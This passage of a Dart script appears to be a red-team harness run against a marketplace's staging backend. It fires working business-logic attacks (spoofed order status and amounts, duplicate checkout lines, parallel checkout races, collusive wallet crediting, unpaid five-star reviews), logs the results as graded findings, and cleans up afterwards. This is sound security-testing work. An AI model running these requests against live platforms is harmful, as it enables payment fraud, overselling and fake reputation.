      {'status': 'pago'},
      {'status': 'reservado'},
      {'status': 'aguarda_confirmacao'},
      {'payment_method': 'MB WAY'},
      {'contract_unit_cents': 1},
    ]) {
      final pr = await rest(
        url,
        anon,
        buyerJwt,
        method: 'PATCH',
        path: '/rest/v1/orders?id=eq.$orderId',
        body: patch,
      );
      note('comp.patch_buyer.${patch.keys.first}', 'buyer PATCH $patch', snapRes(pr));
    }

    // Seller accept / pago off-platform
    final acc = await rest(
      url,
      anon,
      sellerJwt,
      method: 'PATCH',
      path: '/rest/v1/orders?id=eq.$orderId',
      body: {'status': 'reservado'},
    );
    note('comp.seller_accept', 'seller PATCH reservado', snapRes(acc));
    final pago = await rest(
      url,
      anon,
      sellerJwt,
      method: 'PATCH',
      path: '/rest/v1/orders?id=eq.$orderId',
      body: {'status': 'pago'},
    );
    note('comp.seller_pago_platform', 'seller PATCH pago on platform method', snapRes(pago));
  }

  // Second order same SKU (dual unpaid)
  final ord2 = await rest(
    url,
    anon,
    buyerJwt,
    method: 'POST',
    path: '/rest/v1/orders',
    body: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': productId,
      'quantity': 1,
      'status': 'reserva_pendente',
      'payment_method': 'Pagamento na app',
      'shipping_method': 'hand',
    },
  );
  note('comp.second_order', 'second unpaid order same stock=1', snapRes(ord2));
  final order2 = extractId(ord2.body);
  if (order2 != null) cleanupIds['orders']!.add(order2);

  // Checkout both
  if (orderId != null) {
    final ck1 = await http.post(
      Uri.parse('$url/functions/v1/create-payment-intent'),
      headers: {
        'apikey': anon,
        'Authorization': 'Bearer $buyerJwt',
        'Content-Type': 'application/json',
      },
      body: jsonEncode({
        'buyer_id': buyerId,
        'seller_id': sellerId,
        'order_id': orderId,
        'product_id': productId,
        'amount': 1,
        'shipping_method': 'hand',
      }),
    );
    note('comp.checkout1', 'checkout order1 amount=1 spoof', snapRes(ck1));
  }
  if (order2 != null) {
    final ck2 = await http.post(
      Uri.parse('$url/functions/v1/create-payment-intent'),
      headers: {
        'apikey': anon,
        'Authorization': 'Bearer $buyerJwt',
        'Content-Type': 'application/json',
      },
      body: jsonEncode({
        'buyer_id': buyerId,
        'order_id': order2,
        'shipping_method': 'hand',
      }),
    );
    note('comp.checkout2', 'checkout order2 same SKU', snapRes(ck2));
  }

  // Bag duplicate line
  if (order2 != null) {
    final bag = await http.post(
      Uri.parse('$url/functions/v1/create-payment-intent'),
      headers: {
        'apikey': anon,
        'Authorization': 'Bearer $buyerJwt',
        'Content-Type': 'application/json',
      },
      body: jsonEncode({
        'buyer_id': buyerId,
        'order_id': order2,
        'bag_checkout': true,
        'shipping_method': 'hand',
        'bag_lines': [
          {'order_id': order2, 'product_id': productId, 'seller_id': sellerId},
          {'order_id': order2, 'product_id': productId, 'seller_id': sellerId},
        ],
      }),
    );
    note('comp.bag_dup', 'bag checkout duplicate order_id', snapRes(bag));
    if (bag.statusCode == 200 && bag.body.contains('checkout')) {
      finding(
        id: 'RTB-B-1755-P1-BAG-DUP',
        title: 'Bag aceita a mesma order duas vezes',
        severity: 'P1',
        actor: 'buyer JWT',
        preconditions: 'order checkoutable',
        request: 'create-payment-intent bag_lines=[A,A]',
        before: {'order': order2},
        result: snapRes(bag),
        after: snapRes(bag),
        impact: 'cobrança duplicada / settle duplo na mesma unidade',
        reproduction: 'bag_checkout com order_id repetido',
      );
    }
  }

  // Offer reuse: buyer offer, seller accept, two seller-created orders
  final offer = await rest(
    url,
    anon,
    buyerJwt,
    method: 'POST',
    path: '/rest/v1/product_offers',
    body: {
      'product_id': productId,
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'amount': 4.0,
      'offered_by': 'buyer',
      'status': 'accepted',
    },
  );
  note('comp.offer_insert', 'buyer INSERT offer accepted spoof', snapRes(offer));
  var offerId = extractId(offer.body);
  if (offerId != null) cleanupIds['product_offers']!.add(offerId);
  if (offerId != null) {
    final accOff = await rest(
      url,
      anon,
      sellerJwt,
      method: 'PATCH',
      path: '/rest/v1/product_offers?id=eq.$offerId',
      body: {'status': 'accepted', 'responded_at': DateTime.now().toUtc().toIso8601String()},
    );
    note('comp.offer_accept', 'seller accept offer', snapRes(accOff));
    for (var i = 0; i < 2; i++) {
      final so = await rest(
        url,
        anon,
        sellerJwt,
        method: 'POST',
        path: '/rest/v1/orders',
        body: {
          'buyer_id': buyerId,
          'seller_id': sellerId,
          'product_id': productId,
          'product_offer_id': offerId,
          'quantity': 1,
          'status': 'reservado',
          'payment_method': 'MB WAY',
        },
      );
      note('comp.offer_order_$i', 'seller INSERT order from same offer #$i', snapRes(so));
      final oid = extractId(so.body);
      if (oid != null) cleanupIds['orders']!.add(oid);
    }
  }

  // Live + reservation vs marketplace
  final live = await rest(
    url,
    anon,
    sellerJwt,
    method: 'POST',
    path: '/rest/v1/lives',
    body: {
      'seller_id': sellerId,
      'title': '$tag live',
      'status': 'ended',
      'is_active': false,
    },
  );
  note('comp.live_create', 'seller INSERT live', snapRes(live));
  final liveId = extractId(live.body);
  if (liveId != null) {
    cleanupIds['lives']!.add(liveId);
    final li = await rest(
      url,
      anon,
      sellerJwt,
      method: 'POST',
      path: '/rest/v1/live_items',
      body: {
        'live_id': liveId,
        'seller_id': sellerId,
        'product_id': productId,
        'title': '$tag li',
        'price': 6.5,
        'quantity': 2,
      },
    );
    note('comp.live_item', 'live_item qty=2 on product qty=1', snapRes(li));
    final liveItemId = extractId(li.body);
    if (liveItemId != null) {
      cleanupIds['live_items']!.add(liveItemId);
      // Buyer pending reservation
      final resB = await rest(
        url,
        anon,
        buyerJwt,
        method: 'POST',
        path: '/rest/v1/live_reservation_requests',
        body: {
          'live_id': liveId,
          'live_item_id': liveItemId,
          'seller_id': sellerId,
          'buyer_id': buyerId,
          'requested_qty': 1,
          'status': 'accepted',
          'source': 'fleaber_live',
        },
      );
      note('comp.res_buyer_accepted', 'buyer INSERT reservation accepted', snapRes(resB));
      final rid = extractId(resB.body);
      if (rid != null) cleanupIds['live_reservation_requests']!.add(rid);

      // Seller accept / insert consuming
      final resS = await rest(
        url,
        anon,
        sellerJwt,
        method: 'POST',
        path: '/rest/v1/live_reservation_requests',
        body: {
          'live_id': liveId,
          'live_item_id': liveItemId,
          'seller_id': sellerId,
          'buyer_id': buyerId,
          'requested_qty': 2,
          'status': 'accepted',
          'source': 'fleaber_live',
        },
      );
      note('comp.res_seller_qty2', 'seller INSERT accepted qty=2 vs product=1', snapRes(resS));
      final rid2 = extractId(resS.body);
      if (rid2 != null) cleanupIds['live_reservation_requests']!.add(rid2);

      if (rid != null) {
        final accR = await rest(
          url,
          anon,
          sellerJwt,
          method: 'PATCH',
          path: '/rest/v1/live_reservation_requests?id=eq.$rid',
          body: {'status': 'accepted'},
        );
        note('comp.res_patch_accept', 'seller PATCH reservation accepted', snapRes(accR));
      }

      final stock = await rest(
        url,
        anon,
        sellerJwt,
        method: 'POST',
        path: '/rest/v1/rpc/batata_live_item_stock',
        body: {'p_live_item_id': liveItemId},
      );
      note('comp.live_stock_rpc', 'live_item_stock after dual paths', snapRes(stock));

      // Live order + marketplace already exist
      final liveOrd = await rest(
        url,
        anon,
        buyerJwt,
        method: 'POST',
        path: '/rest/v1/orders',
        body: {
          'buyer_id': buyerId,
          'seller_id': sellerId,
          'product_id': productId,
          'live_id': liveId,
          'live_item_id': liveItemId,
          'quantity': 1,
          'status': 'reserva_pendente',
          'payment_method': 'Pagamento na app',
          'shipping_method': 'hand',
        },
      );
      note('comp.live_order', 'order with live_item + same product', snapRes(liveOrd));
      final loid = extractId(liveOrd.body);
      if (loid != null) {
        cleanupIds['orders']!.add(loid);
        final ckL = await http.post(
          Uri.parse('$url/functions/v1/create-payment-intent'),
          headers: {
            'apikey': anon,
            'Authorization': 'Bearer $buyerJwt',
            'Content-Type': 'application/json',
          },
          body: jsonEncode({
            'buyer_id': buyerId,
            'order_id': loid,
            'shipping_method': 'hand',
          }),
        );
        note('comp.live_checkout', 'checkout live order while marketplace order exists', snapRes(ckL));
      }
    }
  }

  // Reviews without paid
  if (orderId != null) {
    final rev = await rest(
      url,
      anon,
      buyerJwt,
      method: 'POST',
      path: '/rest/v1/reviews',
      body: {
        'order_id': orderId,
        'author_id': buyerId,
        'target_id': sellerId,
        'stars': 5,
        'comment': tag,
        'author_role': 'comprador',
      },
    );
    note('comp.review_unpaid', 'review on possibly unpaid order', snapRes(rev));
    if (rev.statusCode >= 200 && rev.statusCode < 300) {
      finding(
        id: 'RTB-B-1755-P1-REVIEW',
        title: 'Review inserida sem captura/pago autoritativo',
        severity: 'P1',
        actor: 'buyer JWT',
        preconditions: 'order do próprio',
        request: 'POST /reviews stars=5',
        before: {'order': orderId},
        result: snapRes(rev),
        after: snapRes(rev),
        impact: 'reputação + possível wallet release',
        reproduction: 'INSERT reviews em order não paga',
      );
    }
  }

  // Bundle seller-fabricated accepted
  final bun = await rest(
    url,
    anon,
    sellerJwt,
    method: 'POST',
    path: '/rest/v1/product_bundles',
    body: {
      'seller_id': sellerId,
      'buyer_id': buyerId,
      'product_ids': [productId],
      'status': 'accepted',
    },
  );
  note('comp.bundle_accepted', 'seller INSERT bundle already accepted', snapRes(bun));
  final bid = extractId(bun.body);
  if (bid != null) {
    cleanupIds['product_bundles']!.add(bid);
    if (bun.statusCode >= 200 && bun.statusCode < 300) {
      finding(
        id: 'RTB-B-1755-P2-BUNDLE-ACC',
        title: 'Seller INSERT product_bundle já accepted',
        severity: 'P2',
        actor: 'seller JWT',
        preconditions: 'product_bundles guard',
        request: 'POST product_bundles status=accepted buyer=victim',
        before: {},
        result: snapRes(bun),
        after: snapRes(bun),
        impact: 'relação bundle sem consentimento do buyer (oracle/UX)',
        reproduction: 'INSERT bundle accepted como seller',
      );
    }
  }

  // Banking after fabricated reservado MB WAY
  final mb = await rest(
    url,
    anon,
    buyerJwt,
    method: 'POST',
    path: '/rest/v1/orders',
    body: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': productId,
      'quantity': 1,
      'status': 'reservado',
      'payment_method': 'MB WAY',
    },
  );
  note('comp.mbway_self_reservado', 'buyer INSERT MB WAY reservado', snapRes(mb));
  final mbid = extractId(mb.body);
  if (mbid != null) cleanupIds['orders']!.add(mbid);
  final bank = await rest(
    url,
    anon,
    buyerJwt,
    method: 'POST',
    path: '/rest/v1/rpc/batata_seller_direct_payment_details',
    body: {'p_seller_id': sellerId},
  );
  note('comp.bank_after_mb_insert', 'banking RPC after MB WAY insert', snapRes(bank));
}

Future<void> cycleRace(
  LiveOpsStagingClient client,
  String url,
  String anon,
  String buyerJwt,
  String sellerJwt,
  String buyerId,
  String sellerId,
) async {
  final prod = await rest(
    url,
    anon,
    sellerJwt,
    method: 'POST',
    path: '/rest/v1/products',
    body: {
      'seller_id': sellerId,
      'title': '$tag race stock1',
      'price': 5.0,
      'quantity': 1,
      'is_sold': false,
      'list_on_marketplace': true,
    },
  );
  final productId = extractId(prod.body);
  if (productId == null) {
    note('race.product_fail', 'no product', snapRes(prod));
    return;
  }
  cleanupIds['products']!.add(productId);

  Future<http.Response> mkOrder() => rest(
        url,
        anon,
        buyerJwt,
        method: 'POST',
        path: '/rest/v1/orders',
        body: {
          'buyer_id': buyerId,
          'seller_id': sellerId,
          'product_id': productId,
          'quantity': 1,
          'status': 'reserva_pendente',
          'payment_method': 'Pagamento na app',
          'shipping_method': 'hand',
        },
      );

  final burst = await Future.wait(List.generate(8, (_) => mkOrder()));
  final created = <String>[];
  for (var i = 0; i < burst.length; i++) {
    note('race.order_$i', 'burst order $i', snapRes(burst[i]));
    final id = extractId(burst[i].body);
    if (id != null) {
      created.add(id);
      cleanupIds['orders']!.add(id);
    }
  }

  final checkouts = await Future.wait(
    created.take(4).map(
          (oid) => http.post(
            Uri.parse('$url/functions/v1/create-payment-intent'),
            headers: {
              'apikey': anon,
              'Authorization': 'Bearer $buyerJwt',
              'Content-Type': 'application/json',
            },
            body: jsonEncode({
              'buyer_id': buyerId,
              'order_id': oid,
              'shipping_method': 'hand',
            }),
          ),
        ),
  );
  var sessions = 0;
  for (var i = 0; i < checkouts.length; i++) {
    note('race.ck_$i', 'parallel checkout $i', snapRes(checkouts[i]));
    if (checkouts[i].statusCode == 200 &&
        (checkouts[i].body.contains('checkoutUrl') ||
            checkouts[i].body.contains('checkoutSessionId'))) {
      sessions++;
    }
  }
  note('race.sessions', 'parallel checkout sessions for stock=1', {
    'orders_created': created.length,
    'sessions': sessions,
  });
  if (sessions >= 2) {
    finding(
      id: 'RTB-B-1755-P2-HOLD',
      title: 'Duas Checkout Sessions no mesmo stock=1 (hold não atómico)',
      severity: 'P2',
      actor: 'buyer JWT burst',
      preconditions: 'product.quantity=1; N orders reserva_pendente',
      request: 'N POST create-payment-intent em paralelo',
      before: {'product': productId, 'qty': 1},
      result: {'sessions': sessions, 'orders': created.length},
      after: {'sessions': sessions},
      impact:
          'duas capturas possíveis; settle deve refund oversell — não provado pago permanente sem Stripe pay',
      reproduction: 'criar 2+ orders e checkout paralelo antes de qualquer settle',
    );
  }
}

Future<void> cycleCollusion(
  LiveOpsStagingClient client,
  String url,
  String anon,
  String svc,
  String buyerJwt,
  String sellerJwt,
  String buyerId,
  String sellerId,
) async {
  final prod = await rest(
    url,
    anon,
    sellerJwt,
    method: 'POST',
    path: '/rest/v1/products',
    body: {
      'seller_id': sellerId,
      'title': '$tag collusion',
      'price': 8.0,
      'quantity': 1,
      'is_sold': false,
      'list_on_marketplace': true,
    },
  );
  final productId = extractId(prod.body);
  if (productId == null) return;
  cleanupIds['products']!.add(productId);

  final ord = await rest(
    url,
    anon,
    buyerJwt,
    method: 'POST',
    path: '/rest/v1/orders',
    body: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': productId,
      'quantity': 1,
      'status': 'reserva_pendente',
      'payment_method': 'MB WAY',
    },
  );
  final orderId = extractId(ord.body);
  if (orderId == null) {
    note('col.order_fail', 'collusion order', snapRes(ord));
    return;
  }
  cleanupIds['orders']!.add(orderId);

  await rest(
    url,
    anon,
    sellerJwt,
    method: 'PATCH',
    path: '/rest/v1/orders?id=eq.$orderId',
    body: {'status': 'reservado'},
  );
  final pago = await rest(
    url,
    anon,
    sellerJwt,
    method: 'PATCH',
    path: '/rest/v1/orders?id=eq.$orderId',
    body: {'status': 'pago'},
  );
  note('col.seller_pago_mbway', 'collusion seller marks MB WAY pago', snapRes(pago));

  final after = await rest(
    url,
    svc,
    svc,
    path:
        '/rest/v1/orders?id=eq.$orderId&select=id,status,amount_paid_cents,stock_units_applied,wallet_release_processed_at',
  );
  final prodAfter = await rest(
    url,
    svc,
    svc,
    path: '/rest/v1/products?id=eq.$productId&select=id,quantity,is_sold',
  );
  final wal = await rest(
    url,
    svc,
    svc,
    path: '/rest/v1/wallets?id=eq.$sellerId&select=id,balance,available_balance,pending_balance',
  );
  final wt = await rest(
    url,
    svc,
    svc,
    path:
        '/rest/v1/wallet_transactions?order_id=eq.$orderId&select=id,wallet_id,amount,type',
  );
  note('col.after', 'observe money/stock after off-platform pago', {
    'order': snapRes(after),
    'product': snapRes(prodAfter),
    'wallet': snapRes(wal),
    'ledger': snapRes(wt),
  });

  try {
    final olist = jsonDecode(after.body) as List;
    final plist = jsonDecode(prodAfter.body) as List;
    final wlist = jsonDecode(wt.body) as List;
    if (olist.isNotEmpty && plist.isNotEmpty) {
      final o = olist.first as Json;
      final p = plist.first as Json;
      final st = '${o['status']}'.toLowerCase();
      final qty = p['quantity'];
      if (st == 'pago' && (qty == 0 || p['is_sold'] == true)) {
        final minted = wlist.any((e) => (e as Json)['type'] == 'venda');
        if (minted) {
          finding(
            id: 'RTB-B-1755-P0-MBWAY-MINT',
            title: 'MB WAY pago credita wallet sem captura Stripe',
            severity: 'P0',
            actor: 'seller JWT (collusion buyer+seller)',
            preconditions: 'order payment_method MB WAY; seller PATCH pago',
            request: 'PATCH orders status=pago',
            before: {'amount_paid_cents': 0},
            result: {'order': o, 'product': p, 'ledger': wlist},
            after: {'order': o, 'ledger': wlist},
            impact: 'criação líquida de saldo levantável',
            reproduction: 'order off-platform → seller pago → wallet type=venda',
          );
        } else {
          note('col.stock_without_mint', 'off-platform pago consumes stock, no wallet mint', {
            'order': o,
            'product': p,
          });
        }
      }
    }
  } catch (e) {
    note('col.parse', 'parse after', {'error': e.toString()});
  }

  // Review after off-platform pago
  final rev = await rest(
    url,
    anon,
    buyerJwt,
    method: 'POST',
    path: '/rest/v1/reviews',
    body: {
      'order_id': orderId,
      'author_id': buyerId,
      'target_id': sellerId,
      'stars': 5,
      'comment': '$tag collusion review',
      'author_role': 'comprador',
    },
  );
  note('col.review', 'review after off-platform pago', snapRes(rev));
  if (rev.statusCode >= 200 && rev.statusCode < 300) {
    finding(
      id: 'RTB-B-1755-P1-REVIEW-OFFPLAT',
      title: 'Review 5★ após pago off-platform sem captura',
      severity: 'P1',
      actor: 'buyer+seller collusion',
      preconditions: 'seller marcou MB WAY pago; amount_paid_cents=0',
      request: 'POST /reviews stars=5',
      before: {'order': orderId},
      result: snapRes(rev),
      after: snapRes(rev),
      impact: 'reputação sem dinheiro na plataforma; possível release wallet',
      reproduction: 'MB WAY pago → review',
    );
  }
}

Future<void> cleanup(LiveOpsStagingClient client) async {
  for (final oid in cleanupIds['orders']!) {
    try {
      await client.deleteWhere('orders', 'id=eq.$oid');
    } catch (_) {}
  }
  for (final id in cleanupIds['live_reservation_requests']!) {
    try {
      await client.deleteWhere('live_reservation_requests', 'id=eq.$id');
    } catch (_) {}
  }
  for (final id in cleanupIds['live_items']!) {
    try {
      await client.deleteWhere('live_items', 'id=eq.$id');
    } catch (_) {}
  }
  for (final id in cleanupIds['lives']!) {
    try {
      await client.deleteWhere('lives', 'id=eq.$id');
    } catch (_) {}
  }
  for (final id in cleanupIds['product_offers']!) {
    try {
      await client.deleteWhere('product_offers', 'id=eq.$id');
    } catch (_) {}
  }
  for (final id in cleanupIds['product_bundles']!) {
    try {
      await client.deleteWhere('product_bundles', 'id=eq.$id');
    } catch (_) {}
  }
  for (final id in cleanupIds['products']!) {
    try {
      await client.deleteWhere('products', 'id=eq.$id');
    } catch (_) {}
  }
}
